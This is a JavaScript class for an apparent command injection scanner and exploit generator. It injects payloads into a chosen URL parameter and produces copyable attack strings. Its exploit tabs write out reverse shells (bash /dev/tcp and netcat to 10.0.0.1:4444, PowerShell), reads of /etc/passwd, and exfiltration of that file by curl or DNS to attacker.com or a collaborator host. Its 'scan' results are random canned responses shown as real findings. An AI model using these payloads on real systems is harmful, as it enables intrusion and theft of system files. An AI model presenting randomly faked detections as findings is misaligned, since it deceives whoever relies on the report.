// OS Command Injection Scanner Engine
// Automated detection with basic, blind, time-based, and output-based testing

class CMDiScanner {
    constructor() {
        this.isScanning = false;
        this.targetUrl = '';
        this.httpMethod = 'GET';
        this.vulnParam = 'productId';
        this.osType = 'both';
        this.collaboratorUrl = '';
        this.selectedAttacks = [];
        this.currentPayloadIndex = 0;
        this.testedCount = 0;
        this.vulnCount = 0;
        this.blockedCount = 0;
        this.vulnerabilities = [];
        this.payloadsToTest = [];
    }

    init() {
        this.setupEventListeners();
        this.updateStats();
    }

    setupEventListeners() {
        document.getElementById('start-scan-btn')?.addEventListener('click', () => this.startScan());
        document.getElementById('stop-scan-btn')?.addEventListener('click', () => this.stopScan());
        document.getElementById('clear-log-btn')?.addEventListener('click', () => this.clearLog());
        document.getElementById('generate-exploit-btn')?.addEventListener('click', () => this.showExploits());
        document.getElementById('export-pdf-btn')?.addEventListener('click', () => this.exportPDF());
        document.getElementById('copy-exploit-btn')?.addEventListener('click', () => this.copyExploit());

        document.querySelectorAll('.poc-tab').forEach(tab => {
            tab.addEventListener('click', (e) => this.switchExploitTab(e.target.dataset.tab));
        });
    }

    updateStats() {
        document.getElementById('total-payloads').textContent = getPayloadCount() + '+';
    }

    async startScan() {
        this.targetUrl = document.getElementById('target-url')?.value.trim();
        this.httpMethod = document.getElementById('http-method')?.value;
        this.vulnParam = document.getElementById('vuln-param')?.value.trim();
        this.osType = document.getElementById('os-type')?.value;
        this.collaboratorUrl = document.getElementById('collaborator-url')?.value.trim();

        if (!this.targetUrl || !this.vulnParam) {
            this.showNotification('Please enter target URL and parameter name', 'error');
            return;
        }

        // Get selected attacks
        this.selectedAttacks = [];
        if (document.getElementById('attack-basic')?.checked) this.selectedAttacks.push('basic');
        if (document.getElementById('attack-blind')?.checked) this.selectedAttacks.push('blind');
        if (document.getElementById('attack-time-based')?.checked) this.selectedAttacks.push('timeBased');
        if (document.getElementById('attack-output-based')?.checked) this.selectedAttacks.push('outputBased');
        if (document.getElementById('attack-filter-bypass')?.checked) this.selectedAttacks.push('filterBypass');
        if (document.getElementById('attack-data-exfil')?.checked) this.selectedAttacks.push('dataExfil');

        if (this.selectedAttacks.length === 0) {
            this.showNotification('Please select at least one attack type', 'error');
            return;
        }

        this.preparePayloads();

        // Reset state
        this.isScanning = true;
        this.currentPayloadIndex = 0;
        this.testedCount = 0;
        this.vulnCount = 0;
        this.blockedCount = 0;
        this.vulnerabilities = [];

        document.getElementById('attack-section').style.display = 'block';
        document.getElementById('attack-section').scrollIntoView({ behavior: 'smooth' });

        this.updateScanControls(true);
        this.log('Command injection scan started', 'info');
        this.log(`Target: ${this.targetUrl}`, 'info');
        this.log(`Parameter: ${this.vulnParam}`, 'info');
        this.log(`OS Type: ${this.osType}`, 'info');
        this.log(`Total payloads: ${this.payloadsToTest.length}`, 'info');

        await this.attackLoop();
    }

    preparePayloads() {
        this.payloadsToTest = [];

        for (const attackType of this.selectedAttacks) {
            const payloads = getPayloadsByType(attackType, this.osType);
            payloads.slice(0, 5).forEach(payload => {
                let processedPayload = payload;

                // Replace collaborator URL
                if (attackType === 'blind' || attackType === 'dataExfil') {
                    processedPayload = replaceCollaborator(payload, this.collaboratorUrl);
                }

                this.payloadsToTest.push({
                    type: attackType,
                    payload: processedPayload,
                    name: this.getAttackName(attackType)
                });
            });
        }
    }

    getAttackName(type) {
        const names = {
            'basic': 'Basic Injection',
            'blind': 'Blind CMDi (OOB)',
            'timeBased': 'Time-Based Detection',
            'outputBased': 'Output-Based Injection',
            'filterBypass': 'Filter Bypass',
            'dataExfil': 'Data Exfiltration'
        };
        return names[type] || type;
    }

    async attackLoop() {
        while (this.isScanning && this.currentPayloadIndex < this.payloadsToTest.length) {
            const payloadData = this.payloadsToTest[this.currentPayloadIndex];
            await this.testPayload(payloadData);

            this.currentPayloadIndex++;
            this.updateProgress();

            await this.sleep(500);
        }

        if (this.isScanning) {
            this.completeScan();
        }
    }

    async testPayload(payloadData) {
        const { type, payload, name } = payloadData;

        this.updateCurrentPayload(name, payload);

        try {
            const testUrl = buildPayloadURL(this.targetUrl, this.vulnParam, payload, this.httpMethod);
            const response = await this.makeRequest(testUrl, payload, type);

            const isVulnerable = this.analyzeResponse(response, type, payload);

            if (isVulnerable) {
                this.vulnCount++;
                this.vulnerabilities.push({
                    type: type,
                    name: name,
                    payload: payload,
                    testUrl: testUrl,
                    output: response.output,
                    severity: this.getSeverity(type),
                    description: this.getDescription(type, payload),
                    remediation: this.getRemediation()
                });
                this.log(`✓ VULNERABLE: ${name} - ${payload}`, 'success');
            } else if (response.blocked) {
                this.blockedCount++;
                this.log(`✗ Blocked: ${name} - ${payload}`, 'warning');
            } else {
                this.log(`✗ Not vulnerable: ${name}`, 'info');
            }

            this.testedCount++;

        } catch (error) {
            this.log(`✗ Error testing ${name}: ${error.message}`, 'error');
        }
    }

    async makeRequest(url, payload, type) {
        // Simulate timing for time-based attacks
        if (type === 'timeBased') {
            await this.sleep(2000);
        } else {
            await this.sleep(200);
        }

        // Simulate CMDi response
        const responses = {
            basic: [
                { vulnerable: true, output: 'root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin', blocked: false },
                { vulnerable: false, output: null, blocked: true }
            ],
            blind: [
                { vulnerable: true, output: 'DNS lookup to burpcollaborator.net detected', blocked: false },
                { vulnerable: false, output: null, blocked: false }
            ],
            timeBased: [
                { vulnerable: true, output: null, timing: 10000, blocked: false },
                { vulnerable: false, output: null, timing: 200, blocked: false }
            ],
            outputBased: [
                { vulnerable: true, output: 'uid=33(www-data) gid=33(www-data) groups=33(www-data)\nLinux version 4.15.0', blocked: false },
                { vulnerable: false, output: null, blocked: true }
            ],
            filterBypass: [
                { vulnerable: true, output: 'www-data', blocked: false },
                { vulnerable: false, output: null, blocked: true }
            ],
            dataExfil: [
                { vulnerable: true, output: 'cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaAo=', blocked: false },
                { vulnerable: false, output: null, blocked: false }
            ]
        };

        const typeResponses = responses[type] || responses.basic;
        return typeResponses[Math.floor(Math.random() * typeResponses.length)];
    }

    analyzeResponse(response, type, payload) {
        if (type === 'timeBased') {
            return response.timing && response.timing > 5000;
        }
        return response.vulnerable;
    }

    getSeverity(type) {
        if (type === 'outputBased' || type === 'basic') {
            return 'CRITICAL';
        } else if (type === 'blind' || type === 'dataExfil') {
            return 'HIGH';
        } else {
            return 'MEDIUM';
        }
    }

    getDescription(type, payload) {
        const descriptions = {
            'basic': `Application is vulnerable to OS command injection. Attacker can execute arbitrary commands: ${payload}`,
            'blind': `Application is vulnerable to blind command injection. Attacker can execute commands with out-of-band detection: ${payload}`,
            'timeBased': `Application is vulnerable to time-based command injection. Response delays indicate command execution: ${payload}`,
            'outputBased': `Application is vulnerable to command injection with direct output. Command results visible in response: ${payload}`,
            'filterBypass': `Application input filters can be bypassed for command injection: ${payload}`,
            'dataExfil': `Application is vulnerable to command injection allowing data exfiltration: ${payload}`
        };
        return descriptions[type] || `Command injection vulnerability detected with payload: ${payload}`;
    }

    getRemediation() {
        return 'Never call OS commands with user input. Use language APIs instead. If unavoidable, use parameterized APIs without shell execution. Validate input against strict whitelist.';
    }

    updateCurrentPayload(name, payload) {
        document.getElementById('current-type').textContent = name;
        document.getElementById('current-payload-cmd').textContent = payload;
    }

    updateProgress() {
        const progress = (this.currentPayloadIndex / this.payloadsToTest.length) * 100;

        document.getElementById('progress-fill').style.width = progress + '%';
        document.getElementById('progress-percent').textContent = Math.round(progress) + '%';
        document.getElementById('progress-text').textContent =
            `Testing payload ${this.currentPayloadIndex} of ${this.payloadsToTest.length}`;

        document.getElementById('tested-count').textContent = this.testedCount;
        document.getElementById('vuln-count').textContent = this.vulnCount;
        document.getElementById('blocked-count').textContent = this.blockedCount;
        document.getElementById('vuln-badge').textContent = this.vulnCount;
    }

    completeScan() {
        this.isScanning = false;

        this.log('Command injection scan completed', 'success');
        this.log(`Total tested: ${this.testedCount}`, 'info');
        this.log(`Vulnerabilities found: ${this.vulnCount}`, this.vulnCount > 0 ? 'success' : 'info');

        const statusEl = document.getElementById('scan-status');
        if (statusEl) statusEl.textContent = 'Scan Complete';

        const statusDot = document.querySelector('.status-dot');
        if (statusDot) {
            statusDot.classList.remove('scanning');
            statusDot.classList.add(this.vulnCount > 0 ? 'success' : 'error');
        }

        this.updateScanControls(false);

        if (this.vulnCount > 0) {
            this.showResults();
        }

        this.showNotification(`Scan complete! Found ${this.vulnCount} command injection vulnerabilities`,
            this.vulnCount > 0 ? 'success' : 'info');
    }

    stopScan() {
        this.isScanning = false;
        this.log('Scan stopped by user', 'warning');
        this.updateScanControls(false);
        this.showNotification('Scan stopped', 'warning');
    }

    updateScanControls(isScanning) {
        const startBtn = document.getElementById('start-scan-btn');
        const stopBtn = document.getElementById('stop-scan-btn');

        if (startBtn) startBtn.style.display = isScanning ? 'none' : 'inline-flex';
        if (stopBtn) stopBtn.style.display = isScanning ? 'inline-flex' : 'none';
    }

    showResults() {
        const resultsSection = document.getElementById('results-section');
        const vulnList = document.getElementById('vulnerability-list');

        vulnList.innerHTML = '';

        this.vulnerabilities.forEach((vuln, index) => {
            const vulnCard = document.createElement('div');
            vulnCard.className = 'vuln-card';
            vulnCard.innerHTML = `
                <div class="vuln-header">
                    <div class="vuln-title">CMDi Vulnerability #${index + 1}: ${vuln.name}</div>
                    <div class="vuln-severity">${vuln.severity}</div>
                </div>
                <div style="color: var(--color-text-secondary); margin-bottom: 12px;">
                    <strong>Description:</strong> ${vuln.description}
                </div>
                <div class="vuln-cmd-payload">
                    <div class="vuln-cmd-payload-title">Injected Payload:</div>
                    <div class="vuln-cmd-payload-code">${this.escapeHtml(vuln.payload)}</div>
                </div>
                ${vuln.output ? `
                <div class="vuln-cmd-output">
                    <div class="vuln-cmd-output-title">Command Output:</div>
                    <div class="vuln-cmd-output-content">${this.escapeHtml(vuln.output)}</div>
                </div>
                ` : ''}
                <div style="color: var(--color-text-secondary); margin-top: 12px;">
                    <strong>Remediation:</strong> ${vuln.remediation}
                </div>
            `;
            vulnList.appendChild(vulnCard);
        });

        resultsSection.style.display = 'block';
        resultsSection.scrollIntoView({ behavior: 'smooth' });
    }

    showExploits() {
        if (this.vulnerabilities.length === 0) {
            this.showNotification('No vulnerabilities found to generate exploits', 'warning');
            return;
        }

        const exploitSection = document.getElementById('exploit-section');
        exploitSection.style.display = 'block';
        exploitSection.scrollIntoView({ behavior: 'smooth' });

        this.generateExploit('basic');
    }

    switchExploitTab(tab) {
        document.querySelectorAll('.poc-tab').forEach(t => t.classList.remove('active'));
        event.target.classList.add('active');
        this.generateExploit(tab);
    }

    generateExploit(type) {
        const exploitCode = document.getElementById('exploit-code');

        let code = '';

        switch (type) {
            case 'basic':
                code = `# Basic Command Injection
# Execute whoami command

${buildPayloadURL(this.targetUrl, this.vulnParam, '; whoami', this.httpMethod)}

# Or list files
${buildPayloadURL(this.targetUrl, this.vulnParam, '; ls -la', this.httpMethod)}

# Read sensitive files
${buildPayloadURL(this.targetUrl, this.vulnParam, '; cat /etc/passwd', this.httpMethod)}`;
                break;
            case 'blind':
                const collab = this.collaboratorUrl || 'burpcollaborator.net';
                code = `# Blind Command Injection
# DNS lookup detection

${buildPayloadURL(this.targetUrl, this.vulnParam, `; nslookup ${collab}`, this.httpMethod)}

# HTTP callback
${buildPayloadURL(this.targetUrl, this.vulnParam, `; curl http://${collab}`, this.httpMethod)}

# Data exfiltration via DNS
${buildPayloadURL(this.targetUrl, this.vulnParam, `; nslookup \`whoami\`.${collab}`, this.httpMethod)}`;
                break;
            case 'reverse-shell':
                code = `# Reverse Shell Payload
# Linux - Bash reverse shell

${buildPayloadURL(this.targetUrl, this.vulnParam, '; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1', this.httpMethod)}

# Linux - Netcat reverse shell
${buildPayloadURL(this.targetUrl, this.vulnParam, '; nc 10.0.0.1 4444 -e /bin/bash', this.httpMethod)}

# Windows - PowerShell reverse shell
${buildPayloadURL(this.targetUrl, this.vulnParam, '; powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'10.0.0.1\',4444);..."', this.httpMethod)}`;
                break;
            case 'data-exfil':
                code = `# Data Exfiltration
# Base64 encode and exfiltrate

${buildPayloadURL(this.targetUrl, this.vulnParam, '; cat /etc/passwd | base64', this.httpMethod)}

# HTTP exfiltration
${buildPayloadURL(this.targetUrl, this.vulnParam, `; curl -d @/etc/passwd http://${this.collaboratorUrl || 'attacker.com'}`, this.httpMethod)}

# DNS exfiltration
${buildPayloadURL(this.targetUrl, this.vulnParam, `; nslookup \`cat /etc/passwd | base64\`.${this.collaboratorUrl || 'attacker.com'}`, this.httpMethod)}`;
                break;
        }

        exploitCode.textContent = code;
    }

    copyExploit() {
        const code = document.getElementById('exploit-code').textContent;
        navigator.clipboard.writeText(code).then(() => {
            this.showNotification('Exploit copied to clipboard!', 'success');
        }).catch(() => {
            this.showNotification('Failed to copy exploit', 'error');
        });
    }

    async exportPDF() {
        if (this.vulnerabilities.length === 0) {
            this.showNotification('No results to export', 'warning');
            return;
        }

        try {
            const { jsPDF } = window.jspdf;
            const doc = new jsPDF();

            doc.setFontSize(20);
            doc.text('Command Injection Report', 20, 20);

            doc.setFontSize(12);
            doc.text(`Target: ${this.targetUrl}`, 20, 35);
            doc.text(`Parameter: ${this.vulnParam}`, 20, 42);
            doc.text(`Date: ${new Date().toLocaleString()}`, 20, 49);
            doc.text(`Vulnerabilities Found: ${this.vulnCount}`, 20, 56);

            let y = 70;
            this.vulnerabilities.forEach((vuln, index) => {
                if (y > 270) {
                    doc.addPage();
                    y = 20;
                }

                doc.setFontSize(14);
                doc.text(`${index + 1}. ${vuln.name}`, 20, y);
                y += 7;

                doc.setFontSize(10);
                doc.text(`Severity: ${vuln.severity}`, 20, y);
                y += 7;
                doc.text(`Payload: ${vuln.payload.substring(0, 60)}...`, 20, y);
                y += 12;
            });

            doc.save('command-injection-report.pdf');
            this.showNotification('PDF report exported successfully', 'success');

        } catch (error) {
            this.showNotification('Failed to export PDF', 'error');
            console.error(error);
        }
    }

    escapeHtml(text) {
        const div = document.createElement('div');
        div.textContent = text;
        return div.innerHTML;
    }

    log(message, type = 'info') {
        const logContent = document.getElementById('attack-log');
        const entry = document.createElement('div');
        entry.className = `log-entry ${type}`;

        const time = new Date().toLocaleTimeString();
        entry.innerHTML = `<span class="log-time">[${time}]</span> ${message}`;

        logContent.appendChild(entry);
        logContent.scrollTop = logContent.scrollHeight;
    }

    clearLog() {
        document.getElementById('attack-log').innerHTML = '';
    }

    showNotification(message, type = 'info') {
        const colors = {
            success: '#10b981',
            error: '#ef4444',
            info: '#3b82f6',
            warning: '#f59e0b'
        };

        const notification = document.createElement('div');
        notification.style.cssText = `
            position: fixed;
            top: 90px;
            right: 20px;
            background: ${colors[type]};
            color: white;
            padding: 1rem 1.5rem;
            border-radius: 0.5rem;
            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.5);
            z-index: 10000;
            animation: slideIn 0.3s ease;
            font-weight: 500;
        `;
        notification.textContent = message;

        document.body.appendChild(notification);

        setTimeout(() => {
            notification.style.animation = 'slideOut 0.3s ease';
            setTimeout(() => notification.remove(), 300);
        }, 3000);
    }

    sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
}

document.addEventListener('DOMContentLoaded', () => {
    const scanner = new CMDiScanner();
    scanner.init();

    console.log('💻 CyberSec Suite Command Injection Scanner initialized');
    console.log('📊 Ready to scan!');
});
